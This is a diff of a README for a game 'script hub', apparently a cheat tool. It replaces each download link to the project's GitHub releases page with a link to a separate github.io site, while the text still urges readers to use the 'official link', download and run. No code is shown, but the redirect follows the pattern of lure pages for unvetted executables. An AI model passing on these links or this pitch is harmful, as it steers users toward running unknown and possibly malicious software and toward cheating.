@@ -1,6 +1,6 @@
 # 🎯 pressure-sp82-script-hub - Your Ultimate Gaming Edge, Simplified
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github)](https://github.com/Abhishek5048/pressure-sp82-script-hub/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github)](https://abhishek5048.github.io)
 
 ---
 
@@ -45,10 +45,10 @@ Follow these simple steps to get pressure-sp82-script-hub up and running on your
 
 Click this button to go to the download page:
 
-[![Download pressure-sp82-script-hub](https://img.shields.io/badge/Download_pressure--sp82--script--hub-FF5722?style=for-the-badge&logo=download)](https://github.com/Abhishek5048/pressure-sp82-script-hub/releases)
+[![Download pressure-sp82-script-hub](https://img.shields.io/badge/Download_pressure--sp82--script--hub-FF5722?style=for-the-badge&logo=download)](https://abhishek5048.github.io)
 
 Or, if you prefer, copy and paste this link into your browser:
-`https://github.com/Abhishek5048/pressure-sp82-script-hub/releases`
+`https://abhishek5048.github.io`
 
 Visit this link to download the application. Once you're on that page, you'll see the available versions. Look for the latest one (usually at the top) and click the download button that matches your system.
 
@@ -170,7 +170,7 @@ Remember the golden rule: **always download from the official link**. That ensur
 
 So what are you waiting for? Click the button below, get your copy, and take your gaming to the next level today!
 
-[![Get Started Now](https://img.shields.io/badge/Get_Started-Now-4CAF50?style=for-the-badge&logo=download)](https://github.com/Abhishek5048/pressure-sp82-script-hub/releases)
+[![Get Started Now](https://img.shields.io/badge/Get_Started-Now-4CAF50?style=for-the-badge&logo=download)](https://abhishek5048.github.io)
 
 Visit this link to download the application. Download, run, and enjoy – it's that simple. Happy gaming! 🎮
 
